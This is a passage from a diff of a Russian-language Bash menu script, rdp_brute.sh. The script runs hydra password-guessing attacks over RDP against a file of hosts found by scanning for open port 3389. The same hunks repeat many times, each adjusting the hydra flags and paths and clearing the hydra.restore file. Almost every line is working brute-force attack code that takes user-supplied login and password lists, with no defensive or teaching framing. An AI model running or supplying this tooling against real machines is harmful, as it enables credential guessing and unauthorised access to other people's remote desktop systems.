 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11941,7 +12609,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11951,7 +12619,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11960,7 +12628,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11988,6 +12656,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11999,7 +12671,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12009,7 +12681,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12019,7 +12691,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12028,7 +12700,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12056,6 +12728,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12067,7 +12743,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12077,7 +12753,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12087,7 +12763,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12096,7 +12772,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12124,6 +12800,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12135,7 +12815,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12145,7 +12825,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12155,7 +12835,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12164,7 +12844,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12192,6 +12872,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12203,7 +12887,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12213,7 +12897,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12223,7 +12907,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12232,7 +12916,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12260,6 +12944,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12271,7 +12959,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12281,7 +12969,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12291,7 +12979,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12300,7 +12988,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12328,6 +13016,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12339,7 +13031,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12349,7 +13041,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12359,7 +13051,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12368,7 +13060,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12396,6 +13088,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12407,7 +13103,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12417,7 +13113,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12427,7 +13123,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12436,7 +13132,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12465,6 +13161,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12476,7 +13176,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12486,7 +13186,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12496,7 +13196,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12505,7 +13205,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12534,6 +13234,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12545,7 +13249,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12555,7 +13259,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12565,7 +13269,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12574,7 +13278,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12602,6 +13306,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12613,7 +13321,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12623,7 +13331,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12633,7 +13341,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12642,7 +13350,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12670,6 +13378,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12681,7 +13393,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12691,7 +13403,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12701,7 +13413,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12710,7 +13422,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12738,6 +13450,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12749,7 +13465,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
